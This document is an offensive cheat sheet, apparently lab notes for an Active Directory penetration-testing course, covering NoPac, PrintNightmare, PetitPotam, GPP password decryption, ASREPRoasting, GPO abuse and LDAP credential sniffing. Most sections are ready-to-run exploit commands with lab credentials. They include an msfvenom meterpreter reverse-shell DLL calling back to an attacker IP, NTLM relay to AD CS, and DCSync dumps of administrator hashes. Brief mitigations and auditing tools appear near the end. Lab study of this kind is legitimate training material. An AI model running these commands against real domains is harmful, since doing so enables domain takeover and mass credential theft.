# Miscellaneous AD Misconfigurations & Attacks

## NoPac (SamAccountName Spoofing)

### Overview
- Exploits CVE-2021-42278 (SAM bypass) and CVE-2021-42287 (Kerberos PAC vulnerability)
- Allows any standard domain user to escalate to Domain Admin in a single command
- Changes a computer account's SamAccountName to match a DC, then requests Kerberos tickets as the DC

### Scanning
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
- If `ms-DS-MachineAccountQuota = 10`, attack is likely possible
- Setting MachineAccountQuota to 0 prevents this attack

### Getting a Shell
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

### DCSync via NoPac
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

### Enumerating for MS-RPRN
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

### Exploit (cube0x0 version)
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host on SMB share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Run exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (MS-EFSRPC / CVE-2021-36942)

### Overview
- Unauthenticated attacker coerces DC to authenticate via NTLM to attacker host
- Relay authentication to AD CS (Certificate Services) to obtain a certificate
- Use certificate to request TGT for the DC machine account, then DCSync

### Attack Chain
```bash
# 1. Start ntlmrelayx targeting AD CS
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Run PetitPotam to coerce DC authentication
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# 3. Use obtained base64 cert to get TGT
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache

# 4. Set ccache and DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Mitigation
- Apply CVE-2021-36942 patch
- Extended Protection for Authentication + Require SSL on CA web enrollment
- Disable NTLM authentication for Domain Controllers
- Disable NTLM on AD CS servers

## Exchange-Related Attacks

### Exchange Windows Permissions Group
- Members can write a DACL to the domain object
- Can be leveraged to grant DCSync privileges
- Often contains users from Account Operators group

### PrivExchange
- Exploits PushSubscription feature to force Exchange server to authenticate
- Exchange runs as SYSTEM with WriteDacl on the domain (pre-2019 CU)
- Relay to LDAP to obtain domain NTDS database

### Organization Management Group
- Effectively "Domain Admins" of Exchange
- Full control of Exchange Security Groups OU
- Can access all domain mailboxes

## Printer Bug (MS-RPRN)
- Any domain user can force a server to authenticate via the Print Spooler service
- Spooler runs as SYSTEM, installed by default on Desktop Experience
- Can relay to LDAP for DCSync or RBCD attack
- Useful for compromising DC in partner domain/forest with Unconstrained Delegation

### Check for Printer Bug
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## Password in Description Field
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

## PASSWD_NOTREQD Accounts
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Credentials in SYSVOL Scripts
```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

## GPP Passwords (MS14-025)

### Overview
- Group Policy Preferences stored .xml files with AES-256 encrypted passwords in SYSVOL
- Microsoft published the AES key, so they are trivially decryptable
- Patched in 2014 but old files may remain

### Decrypt cpassword
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

### NetExec modules
```bash
# GPP passwords
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# GPP autologon
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## ASREPRoasting (from Misc section)
- Targets accounts with "Do not require Kerberos pre-authentication" enabled
- Does not require an SPN like Kerberoasting

### Enumerate
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Windows (Rubeus)
```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

### Linux
```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

### Crack
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## GPO Abuse
- If we have GenericAll/GenericWrite/WriteProperty/WriteDacl over a GPO, we can add rights to users, add local admins, create scheduled tasks

### Enumerate GPOs
```powershell
Get-DomainGPO | select displayname
```

### Check if Domain Users have GPO rights
```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
```

### Convert GPO GUID to name
```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

### Abuse with SharpGPOAbuse
- Can add local admin, create scheduled task, or other actions
- Be careful: commands affect ALL computers in the OU the GPO is linked to

## Enumerating DNS Records
```bash
# Query all AD DNS records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

# Resolve unknown records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

# View results
head records.csv
```

## Kerberos Double Hop Problem
- When authenticating via WinRM/PSRemoting, your TGT isn't forwarded to the remote session
- You can't run AD commands (e.g. PowerView, ADWS) from the remote host without workarounds

### Workaround 1: PSCredential Object
```powershell
$SecPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
Get-DomainUser -SPN -Credential $Cred | Select samaccountname
```

### Workaround 2: Register PSSession Configuration
```powershell
Enter-PSSession -ComputerName <host> -Credential <domain\user>
Register-PSSessionConfiguration -Name <sessname> -RunAsCredential <domain\user>
Restart-Service WinRM

# Re-authenticate with registered session
Enter-PSSession -ComputerName <host> -Credential <domain\user> -ConfigurationName <sessname>
```

## Sniffing LDAP Credentials
- Many devices (printers, apps) store LDAP creds in their web admin console
- Change the LDAP server IP to your attack host + set up listener on port 389
- May receive cleartext credentials when device tests the connection

## Post-Compromise AD Auditing

### DPAT (Domain Password Audit Tool)

Analyze dumped NTDS hashes against cracked passwords for reporting:

```bash
python3 dpat.py -n ntds.dit -c cracked_hashes.txt -g groups.json
```

- Generates HTML report showing password reuse, weak passwords, admin accounts with cracked passwords
- [DPAT GitHub](https://github.com/clr2of8/DPAT)

### PingCastle

Automated AD security assessment tool:

```cmd
PingCastle.exe --healthcheck --server dc01.domain.local
```

- Produces a risk-scored HTML report covering trusts, GPO issues, Kerberos misconfigurations, privileged group membership, and stale objects
- Run from a domain-joined machine or supply credentials
- [PingCastle](https://www.pingcastle.com/)
